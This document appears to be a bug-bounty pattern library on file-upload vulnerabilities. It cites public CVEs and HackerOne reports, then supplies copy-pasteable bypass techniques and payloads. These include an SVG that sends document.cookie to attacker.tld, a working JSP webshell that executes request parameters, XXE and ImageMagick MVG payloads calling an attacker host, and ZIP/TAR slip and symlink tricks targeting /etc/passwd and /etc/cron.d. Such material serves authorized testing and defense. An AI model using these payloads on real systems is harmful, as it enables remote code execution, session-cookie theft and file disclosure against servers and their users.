# hunt-file-upload — Pattern Library

> Patterns and verifiable public examples behind `hunt-file-upload`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge from public bounty disclosures, CVEs, OWASP guidance, and conference research.

File upload pays when the uploaded artifact is *executed* (RCE), *rendered with script context* (stored XSS), *parsed by a downstream tool* (XXE / SSRF / RCE via image processor), or *escapes the intended directory* (path traversal, ZIP slip, symlink). The patterns below organize the attack into the four major impact channels — server-side execution, browser-side execution, archive escape, and parser-side execution — and document the specific bypass tricks that recur across modern targets. Every payload is copy-pasteable; every validation step shows what concrete signal proves the bug.

## Cited Public Examples

### ImageTragick (CVE-2016-3714)
- **Source:** Public disclosure of multiple ImageMagick vulnerabilities in May 2016, branded "ImageTragick" by the discoverer (Stewie). CVE-2016-3714 is the canonical RCE entry; companion CVEs cover file read, SSRF, and additional command-execution sinks. Public advisories from Red Hat, Debian, and the ImageMagick maintainers.
- **Pattern shape:** ImageMagick's MVG (Magick Vector Graphics) and MSL (Magick Scripting Language) parsers accepted attacker-controlled commands. A specially crafted file disguised as an image (correct magic bytes for JPEG/PNG/GIF, but containing MVG content) would, when processed by ImageMagick, execute arbitrary shell commands. The classic payload `push graphic-context\nencoding "UTF-8"\nimage Over 0,0 0,0 'url(https://attacker.tld/x)'\npop graphic-context` triggered an outbound HTTP request from the server.
- **Key trick:** The vulnerability lived in the *delegate* mechanism — ImageMagick called external programs (ghostscript, mvg parser) based on file content. Magic-byte validation did not protect because the file genuinely was a valid image *and* a valid MVG. The fix required either disabling the affected delegates in `policy.xml` or upgrading to a patched ImageMagick.
- **Why it matters:** ImageMagick is on every photo-handling, avatar, thumbnail, and report-generation pipeline. The class of bug — "third-party tool processes uploaded content with unexpected privileges" — recurs in ghostscript (PostScript file → RCE), LibreOffice (DOCX → RCE), ffmpeg (HLS playlist → SSRF), and exiftool. Operators encountering any upload feature with downstream processing should test the polyglot/delegate class before classifying as Low.

### Sam Thomas — "It's a PHP Unserialization Vulnerability Jim, but Not as We Know It" (Black Hat USA 2018)
- **Source:** Sam Thomas, Black Hat USA 2018 talk. The research established the `phar://` stream wrapper attack: PHP automatically deserializes the metadata of a Phar archive whenever a `phar://` URL is referenced by a stream-aware function (`file_exists`, `fopen`, `file_get_contents`, `is_file`, `md5_file`, etc.).
- **Pattern shape:** Attacker uploads a Phar file disguised as an image (correct JPEG/PNG magic bytes prepended to the Phar structure — PHP does not validate the file extension when reading metadata, it scans for the Phar marker). The application later references the uploaded file via a stream-aware function. PHP unserializes the Phar metadata, instantiating attacker-chosen classes; if any reachable class has a `__destruct` or `__wakeup` magic method that reaches a sink, the attacker achieves RCE.
- **Key trick:** The attack does not require `unserialize()` to be called explicitly. The trigger is *any* PHP function that touches `phar://` paths, and the wrapper is invoked transparently. Stream-aware functions are everywhere in PHP code — image-handling, file-existence checks, hash calculations.
- **Why it matters:** Many PHP applications survived a decade of `unserialize` audits but are still vulnerable through the Phar wrapper. The pattern is "upload a polyglot Phar/JPEG, then trigger a stream operation on the uploaded file's path." The fix landed in PHP 8.0 (auto-unserialize disabled) but legacy PHP 7.x deployments remain widespread.

### Apache mod_cgi `.htaccess` upload pattern (multi-CVE class)
- **Source:** Multiple Apache HTTPD security advisories and bounty disclosures across years documenting the same pattern. Apache HTTP Server documentation explicitly warns about user-controlled `.htaccess` files. Recurrent in shared-hosting and CMS upload features.
- **Pattern shape:** A web app permits upload of arbitrary file types including `.htaccess`. The attacker uploads `.htaccess` containing `AddType application/x-httpd-php .png` (or `AddHandler` directives) into a directory that previously served images statically. The next image upload (e.g., `shell.png` containing PHP source) is now executed by mod_php when requested.
- **Key trick:** The bug is not in the upload validation per se — it is in the per-directory configuration override. Operators auditing upload features should always test whether `.htaccess` is accepted, and whether the upload directory has `AllowOverride None` (safe) or `AllowOverride All` (unsafe).
- **Why it matters:** Apache + PHP shared hosting deployments are still common on enterprise legacy hosts and mid-tier CMS platforms (older WordPress hosting, Drupal sites, custom PHP apps). One `.htaccess` upload converts a benign image-upload feature into RCE.

### CVE-2017-12615 / CVE-2017-12617 — Tomcat PUT method RCE
- **Source:** Apache Tomcat security advisory September-October 2017. CVE-2017-12615 (Windows) and CVE-2017-12617 (Linux). Listed on CISA's Known Exploited Vulnerabilities catalogue.
- **Pattern shape:** Apache Tomcat with HTTP PUT enabled (`readonly=false` in DefaultServlet config) accepted file uploads via PUT. The validator rejected `.jsp` extensions but the attacker bypassed by appending `/` to the filename: `PUT /shell.jsp/ HTTP/1.1`. Tomcat's filesystem layer stripped the trailing slash and stored `shell.jsp`, which was then executable.
- **Key trick:** The bypass exploited a normalization mismatch between the validation layer (which sees `shell.jsp/`) and the storage layer (which sees `shell.jsp`). The same shape — validator and storer disagree on the canonical filename — recurs in many CVE entries against different products.
- **Why it matters:** Tomcat is ubiquitous. The CVE provides a verifiable cite for any operator finding PUT enabled. Internal-tooling Tomcat instances frequently still ship `readonly=false`.

## Disclosed HackerOne Reports (bounty-paid examples)

Bounty-paid public disclosures for this class, on top of the research/CVE grounding above. Targets genericized; each links its source.

### Unrestricted upload → webshell / stored script
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/748903>, <https://hackerone.com/reports/1890284>, <https://hackerone.com/reports/3589247>).
- **Pattern shape:** The endpoint accepts an executable or active-content file (php/jsp/svg/html) with no extension/content-type/magic-byte validation, served from a path that renders it → RCE or stored XSS.
- **Key trick:** Upload the app-appropriate payload (svg with script, polyglot, double-extension, null-byte, content-type mismatch) and fetch the stored URL. Confirm execution/rendering, not just acceptance. Check the served `Content-Type` and path.
- **Why it matters:** Direct RCE (server-side exec) or stored XSS (svg/html) depending on serve context — the highest-severity upload outcome.

### Arbitrary file write / path traversal on upload
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/583184>, <https://hackerone.com/reports/3780695>).
- **Pattern shape:** The filename or path parameter isn't sanitized, letting the upload write outside the intended directory (traversal), or a DB/engine primitive (`INTO OUTFILE`) writes attacker content to disk → overwrite/RCE.
- **Key trick:** Inject `../` sequences and absolute paths into the filename/path field; test any server-side write primitive reachable from the app. Confirm the file lands at the traversed path.
- **Why it matters:** File-write as the service account → config overwrite, webshell drop, privilege escalation. Often Critical.

---

## Pattern Library

### Case-sensitivity bypass on extension allowlist
- **When to suspect:** Server validates extension against a case-sensitive blocklist (`if ext == ".php": reject`).
- **Test:** Upload `shell.PHP`, `shell.Php`, `shell.pHp`. Linux filesystems are case-sensitive but PHP-FPM / mod_php often dispatch case-insensitively.
- **Validation:** Fetch the uploaded file. If the response shows PHP execution output (not raw source), bypass succeeded.
- **Pay-grade rationale:** Critical when execution achieved on a public-facing server.

### Double-extension trick
- **When to suspect:** Server validates only the *last* extension or only the *first* extension.
- **Test:** Upload `shell.php.jpg` (last-only validator: sees `.jpg`, accepts; Apache mod_php with `AddHandler` based on inner extension may execute). Or `shell.jpg.php` (first-only validator: sees `.jpg`, accepts; server executes as PHP).
- **Validation:** Fetch the uploaded file. If PHP executes, bypass confirmed.
- **Pay-grade rationale:** Critical.

### Alternative PHP extensions
- **When to suspect:** Blocklist drops `.php` only.
- **Test:** Try `.phar`, `.pht`, `.phtml`, `.php5`, `.php7`, `.phps`, `.phtm`, `.inc`. Most PHP installations execute all of these by default.
- **Validation:** Fetch and observe execution.
- **Pay-grade rationale:** Critical.

### Null-byte truncation (legacy PHP < 5.3)
- **When to suspect:** Target runs ancient PHP. Validator concatenates extension to filename without sanitization.
- **Test:** Upload `shell.php%00.jpg`. Older PHP truncated at null byte, saving as `shell.php`; validator saw `.jpg` and accepted.
- **Validation:** Fetch `shell.php` — execution.
- **Pay-grade rationale:** Critical, but only on legacy targets.

### Content-Type header spoofing
- **When to suspect:** Server validates uploaded MIME by checking the request's `Content-Type` header rather than the file's magic bytes.
- **Test:** Upload PHP source with `Content-Type: image/jpeg` in the multipart part.
- **Validation:** Fetch — execution.
- **Pay-grade rationale:** Critical.

### Magic-byte polyglot (image + PHP)
- **When to suspect:** Validator checks magic bytes but ignores trailing content.
- **Test:** Prepend valid JPEG header (`FF D8 FF E0 ...`) or GIF header (`GIF89a`) to the PHP source. Save as `shell.php` (or with any of the alternative PHP extensions).
- **Validation:** Fetch — PHP executes despite valid image header. ImageMagick / GD-based validators are still bypassed because the file genuinely contains a valid image segment plus PHP source.
- **Pay-grade rationale:** Critical.

### SVG with embedded JavaScript (stored XSS)
- **When to suspect:** Avatar / profile-image upload accepts SVG and serves with `Content-Type: image/svg+xml`.
- **Test:** Upload:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker.tld/x?'+document.cookie)">
    <script>alert(document.domain)</script>
  </svg>
  ```
  Visit the served URL as a top-level navigation (`https://target/uploads/avatar.svg`).
- **Validation:** OOB callback fires with cookies from a victim test account, or `alert` fires when the file is loaded.
- **Pay-grade rationale:** High to critical depending on chain.

### HTML with `.pdf` or `.txt` extension served as `text/html`
- **When to suspect:** Server determines Content-Type from extension lookup table but the table has gaps. Or the server respects an `X-Content-Type-Options: nosniff` absence and MIME-sniffs to HTML.
- **Test:** Upload `shell.pdf` containing `<html><script>alert(1)</script></html>`.
- **Validation:** Browser MIME-sniffs and renders as HTML, script executes.
- **Pay-grade rationale:** High when chained to ATO (stored XSS in admin context).

### ZIP slip — path traversal via archive filename
- **When to suspect:** Application accepts ZIP/TAR archives and extracts them server-side (plugin install, theme upload, bulk import, backup restore).
- **Test:** Craft a ZIP containing a file named `../../../../var/www/html/shell.php` (or similar absolute/relative path). Use `zip --symlinks` or low-level zip libraries to bypass tools that sanitize.
- **Validation:** After upload, check the target path for the extracted file. Fetch via web to confirm execution.
- **Pay-grade rationale:** Critical.

### TAR slip / symlink-in-archive
- **When to suspect:** Application uses `tar -xf` without `--no-overwrite-dir` or similar safeguards.
- **Test:** Create a TAR containing a symlink (`link -> /etc/cron.d/`) and a regular file named `link/x`. Extraction follows the symlink, writing `x` into `/etc/cron.d/x` outside the intended directory.
- **Validation:** File appears in target directory; cron picks it up.
- **Pay-grade rationale:** Critical.

### `.htaccess` upload enabling PHP in image directory
- **When to suspect:** Apache + PHP. Upload feature accepts arbitrary filenames. Upload directory is at `AllowOverride All`.
- **Test:** Upload `.htaccess` with:
  ```
  AddType application/x-httpd-php .png
  ```
  Then upload `shell.png` containing PHP source. Fetch `shell.png` — mod_php executes.
- **Validation:** PHP output in response.
- **Pay-grade rationale:** Critical.

### `web.config` upload on IIS
- **When to suspect:** IIS server. Upload directory accepts `web.config`.
- **Test:** Upload `web.config` declaring a custom handler for `.png`. Fetch a previously-uploaded `.png` containing payload — handler executes it.
- **Validation:** Payload runs in IIS application pool context.
- **Pay-grade rationale:** Critical.

### JSP / WAR upload for Tomcat
- **When to suspect:** Java application server (Tomcat, Jetty, JBoss) with file upload reaching a directory served as a webapp.
- **Test:** Upload `shell.jsp`:
  ```jsp
  <%@ page import="java.util.*,java.io.*"%>
  <% Process p = Runtime.getRuntime().exec(request.getParameter("c")); %>
  <pre><% BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null) out.println(l); %></pre>
  ```
  For `.war` upload to the Tomcat manager (CVE-2017-12615 style), PUT the WAR to a path.
- **Validation:** Fetch `shell.jsp?c=id` — command output in response.
- **Pay-grade rationale:** Critical.

### `.aspx` upload for IIS
- **When to suspect:** IIS + ASP.NET. Upload accepts `.aspx`.
- **Test:** Upload an ASPX webshell. Fetch and observe execution.
- **Validation:** Webshell command output.
- **Pay-grade rationale:** Critical.

### XXE via DOCX / XLSX / SVG upload
- **When to suspect:** Application processes uploaded Office documents (DOCX, XLSX), SVG, or other XML-based formats with a backend XML parser.
- **Test:** Inject XXE into the XML content:
  ```xml
  <!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.tld/x">]>
  <root>&xxe;</root>
  ```
  Embed in `word/document.xml` inside a DOCX, or directly in an SVG file.
- **Validation:** OOB callback from the parsing server; or local-file disclosure via `file:///etc/passwd` entity if response reflects content.
- **Pay-grade rationale:** High to critical depending on what files are reachable.

### Polyglot GIF+JS for client-side XSS chain
- **When to suspect:** Application serves uploaded files with permissive Content-Type and an XSS sink loads them as `<script src=...>`.
- **Test:** Create a file beginning with `GIF89a/*` (valid GIF header that is also a valid JS comment opener), then JS code `*/=1;alert(document.domain);`. Save as `x.gif`.
- **Validation:** Image displays as GIF (or fails benignly), but when loaded as `<script src="x.gif">` the JS executes.
- **Pay-grade rationale:** High when reachable in a script-include chain.

### ImageMagick MVG polyglot (ImageTragick class)
- **When to suspect:** Server processes images with ImageMagick. Validators accept by magic bytes.
- **Test:** Upload an MVG file disguised as JPEG:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://attacker.tld/x)'
  pop graphic-context
  ```
  Or use the classic command injection payload (varies by ImageMagick version and policy.xml).
- **Validation:** OOB callback from the target server during image processing.
- **Pay-grade rationale:** Critical.

### Symlink upload pointing to internal file
- **When to suspect:** Server accepts uploads that include symbolic links and the upload directory is served back as static content.
- **Test:** Create a symlink (`ln -s /etc/passwd link.txt`) and upload it via a multipart form. If preserved, fetching `link.txt` returns the contents of `/etc/passwd`.
- **Validation:** Response body is the linked target file.
- **Pay-grade rationale:** High depending on disclosed content.

---

## Anti-Patterns (FP traps)

### File upload "succeeded" but interpreter not installed
- **Looks like:** Upload of `shell.php` succeeds, file is stored. Operator claims RCE.
- **Actually is:** The server may not have PHP installed (pure static hosting, nginx without PHP-FPM, S3-backed file serving). Without an interpreter parsing the file, it is just bytes on disk.
- **How to disprove:** Fetch the uploaded file and inspect the response. If response shows raw PHP source (`<?php ... ?>` visible) or `Content-Type: text/plain`, the file is not executing. Try uploading `<?php phpinfo(); ?>` instead and fetch — if `phpinfo()` output appears, RCE confirmed; if raw source appears, write primitive only. Reclassify as "arbitrary file upload" (Medium) rather than RCE (Critical).

### SVG XSS that downloads instead of rendering
- **Looks like:** SVG with embedded script uploads successfully. Operator claims stored XSS.
- **Actually is:** The server may serve uploaded files with `Content-Disposition: attachment; filename=...` which forces the browser to download rather than render. No script execution in the target origin.
- **How to disprove:** Inspect the response headers when fetching the SVG. If `Content-Disposition: attachment`, downgrade the finding — there is no XSS chain through standard browser navigation. Look for a separate render path (preview viewer, image proxy) that might render the SVG inline; if none exists, the bug is "SVG accepted as upload" with no script-execution impact.

### Path traversal in filename that the server sanitizes after
- **Looks like:** Multipart filename `../../../etc/cron.d/x` accepted in the upload. Operator claims write-anywhere.
- **Actually is:** Most upload handlers (multer, Django FileField, Rails ActiveStorage) sanitize the filename before writing to disk, either stripping path separators or generating UUID-based names while preserving the original filename only in metadata.
- **How to disprove:** Inspect the stored path on disk (if reachable) or via the file-listing endpoint. If the file is at the intended upload directory under a sanitized name, traversal failed. If the file appears at the traversed path, confirm by writing a unique payload and reading it from the target path. Without that confirmation, the finding is "filename accepted with path characters" — not exploitable.

### Polyglot uploaded but never parsed
- **Looks like:** Polyglot JPEG/PHP file uploaded successfully. Operator assumes RCE.
- **Actually is:** The file may be served as static content with `Content-Type: image/jpeg` and never executed by any interpreter. Storage is not execution.
- **How to disprove:** Identify the *downstream consumer*. Is the upload processed by ImageMagick (RCE via ImageTragick)? Served via Apache with mod_php (RCE if extension dispatches)? Served via S3 (no execution at all)? Determine the consumer before claiming impact. The valid finding is "uploaded file reaches *this specific consumer* which executes it as code." Without the consumer link, the bug is "MIME validation bypass" (Low to Medium).

### Webshell uploaded but `disable_functions` blocks exec
- **Looks like:** PHP webshell uploaded and executes — `<?php phpinfo(); ?>` shows phpinfo output. Operator chains to `system('id')`.
- **Actually is:** PHP `disable_functions = system,exec,shell_exec,passthru,...` in `php.ini` blocks command execution. The webshell can read files and execute PHP code but cannot spawn processes.
- **How to disprove:** Run `phpinfo()` from the shell first. Check `disable_functions` and `open_basedir`. If both lock down execution, classify the finding accurately: "PHP code execution restricted by disable_functions" — still high impact (file read across the open_basedir scope, in-process code execution) but distinct from full shell access. Look for known `disable_functions` bypass techniques (mail header injection via PHP, LD_PRELOAD via putenv, specific extension CVEs) before claiming Critical.
